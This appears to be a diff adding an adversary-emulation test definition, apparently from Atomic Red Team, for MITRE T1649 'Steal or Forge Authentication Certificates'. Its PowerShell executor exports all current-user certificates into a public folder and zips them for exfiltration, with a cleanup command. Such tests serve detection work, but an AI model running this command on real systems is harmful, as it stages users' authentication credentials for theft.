@@ -1,0 +1,24 @@
+{
+    "name": "Staging Local Certificates via Export-Certificate",
+    "description": "Export all user certificates and add to a compressed archive. ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "command": "$archive=\"$env:PUBLIC\\T1649\\atomic_certs.zip\"\n$exfilpath=\"$env:PUBLIC\\T1649\\certs\"\nAdd-Type -assembly \"system.io.compression.filesystem\"\nRemove-Item $(split-path $exfilpath) -Recurse -Force -ErrorAction Ignore\nmkdir $exfilpath | Out-Null\nforeach ($cert in (gci Cert:\\CurrentUser\\My)) { Export-Certificate -Cert $cert -FilePath $exfilpath\\$($cert.FriendlyName).cer}\n[io.compression.zipfile]::CreateFromDirectory($exfilpath, $archive)\n",
+        "cleanup_command": "$exfilpath=\"$env:PUBLIC\\T1649\\certs\"\nRemove-Item $(split-path $exfilpath) -Recurse -Force -ErrorAction Ignore\n",
+        "name": "powershell",
+        "type": "Command Executor"
+    },
+    "id": "T1649",
+    "tactics": [
+        "Credential Access"
+    ],
+    "technique": "Steal or Forge Authentication Certificates",
+    "source": "ART",
+    "uuid": "eb121494-82d1-4148-9e2b-e624e03fbf3d",
+    "arguments": null,
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
